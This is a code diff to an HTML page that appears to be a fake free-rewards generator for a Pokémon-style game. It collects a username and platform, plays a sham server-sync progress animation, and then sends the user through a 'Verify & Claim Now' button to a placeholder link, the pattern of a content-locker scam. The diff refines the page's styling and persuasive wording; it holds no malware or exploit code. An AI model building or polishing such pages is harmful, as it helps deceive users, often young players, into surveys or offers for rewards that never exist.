@@ -39,24 +39,25 @@
             position: relative;
         }
 
-        /* Platform Selector */
-        .platform-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        /* NEW: Back Button */
+        .back-btn {
+            position: absolute; top: 20px; left: 20px; color: #666; cursor: pointer;
+            font-size: 0.75rem; font-weight: 800; transition: 0.3s; display: flex; align-items: center; gap: 5px;
+            text-transform: uppercase; z-index: 10;
+        }
+        .back-btn:hover { color: var(--primary); }
+
+        /* NEW: Platform Selector */
+        .platform-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 15px 0 25px; }
         .platform-item {
             background: rgba(255,255,255,0.03); border: 1px solid var(--border);
             padding: 15px; border-radius: 12px; cursor: pointer; transition: 0.3s;
             display: flex; flex-direction: column; align-items: center; gap: 8px;
         }
-        .platform-item i { font-size: 1.5rem; color: #888; transition: 0.3s; }
+        .platform-item i { font-size: 1.4rem; color: #555; }
         .platform-item.active { border-color: var(--primary); background: rgba(0,242,255,0.1); }
-        .platform-item.active i { color: var(--primary); }
-        .platform-item span { font-size: 0.75rem; font-weight: 800; text-transform: uppercase; }
-
-        /* Back Button Style */
-        .back-btn {
-            position: absolute; top: 20px; left: 20px; color: #666; cursor: pointer;
-            font-size: 0.8rem; font-weight: 700; transition: 0.3s; display: flex; align-items: center; gap: 5px;
-        }
-        .back-btn:hover { color: var(--primary); }
+        .platform-item.active i { color: var(--primary); filter: drop-shadow(0 0 5px var(--primary)); }
+        .platform-item span { font-size: 0.7rem; font-weight: 900; color: #ccc; }
 
         .section-title { 
             font-family: 'Orbitron'; font-size: 0.85rem; color: var(--primary); 
@@ -116,12 +117,12 @@
     <div class="main-card">
         
         <div id="ui-step1">
-            <h2 style="font-family: 'Orbitron'; color: var(--primary); margin-top: 10px;">Trainer Access</h2>
-            <p style="font-size: 0.8rem; color: #888; margin-bottom: 25px;">Connect your account to the Global Sync Server</p>
+            <h2 style="font-family: 'Orbitron'; color: var(--primary);">Trainer Login</h2>
+            <p style="font-size: 0.8rem; color: #888; margin-bottom: 20px;">Connect your account to the Global Sync Server</p>
             
             <input type="text" class="input-ui" id="trainer-id" placeholder="Enter Username...">
             
-            <p style="font-size: 0.7rem; color: var(--primary); text-align: left; margin-bottom: 10px; font-weight: 800;">SELECT PLATFORM</p>
+            <p style="font-size: 0.65rem; color: var(--primary); text-align: left; font-weight: 900; margin-bottom: 8px;">SELECT PLATFORM</p>
             <div class="platform-grid">
                 <div class="platform-item active" onclick="selectPlatform(this)">
                     <i class="fab fa-android"></i>
@@ -137,7 +138,7 @@
         </div>
 
         <div id="ui-step2" class="hidden">
-            <div class="back-btn" onclick="backTo(1)"><i class="fas fa-arrow-left"></i> BACK</div>
+            <div class="back-btn" onclick="backTo(1)"><i class="fas fa-arrow-left"></i> Back</div>
             <div class="section-title">1. RESOURCES</div>
             <div class="grid-layout">
                 <div class="reward-card" onclick="selectItem(this, '50,000 VP')">
@@ -150,7 +151,7 @@
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Elite Pass')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" class="reward-img">
-                    <span>Elite Pass</span><small>S12</small>
+                    <span>Elite Pass</span><small>Season 12</small>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Omni Stone')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" class="reward-img">
@@ -185,7 +186,7 @@
                     <span>Greninja</span>
                 </div>
             </div>
-            <button class="btn-action" style="width: 100%; margin-top: 20px;" onclick="toStep3()">Get Assets Now</button>
+            <button class="btn-action" style="width: 100%; margin-top: 20px;" onclick="toStep3()">Get Selected Assets</button>
         </div>
 
         <div id="ui-sync" class="hidden">
@@ -197,10 +198,10 @@
         </div>
 
         <div id="ui-locker" class="hidden">
-            <div class="back-btn" onclick="backTo(2)"><i class="fas fa-arrow-left"></i> BACK</div>
-            <h2 style="font-family: 'Orbitron'; color: var(--accent); margin-top: 20px;">Verification</h2>
-            <p style="font-size: 0.85rem; color: #ccc;">Finalize the transfer of <span id="final-res" style="color:var(--primary); font-weight:900;">Assets</span> by verifying your session.</p>
-            <div style="padding: 25px; border: 2px dashed var(--primary); border-radius: 15px; margin: 20px 0;">
+            <div class="back-btn" onclick="backTo(2)"><i class="fas fa-arrow-left"></i> Back</div>
+            <h2 style="font-family: 'Orbitron'; color: var(--accent); margin-top: 15px;">Verification Required</h2>
+            <p style="font-size: 0.85rem; color: #ccc;">Claim your <span id="final-res" style="color:var(--primary); font-weight:900;">Assets</span> by verifying your session below.</p>
+            <div style="padding: 25px; border: 2px dashed var(--primary); border-radius: 15px; margin: 20px 0; background: rgba(0,242,255,0.02);">
                 <button class="btn-action" style="margin-top:0;" onclick="window.location.href='YOUR_LINK_HERE'">Verify & Claim Now</button>
             </div>
         </div>
@@ -246,7 +247,7 @@
         const inv = setInterval(() => {
             p += 1;
             document.getElementById('progress-bar').style.width = p + '%';
-            if(p % 33 === 0) document.getElementById('status-text').innerText = msg[Math.floor(p/33)-1];
+            if(p % 33 === 0) document.getElementById('status-text').innerText = msg[Math.floor(p/33)-1] || "Syncing...";
             if(p >= 100) {
                 clearInterval(inv);
                 document.getElementById('ui-sync').classList.add('hidden');
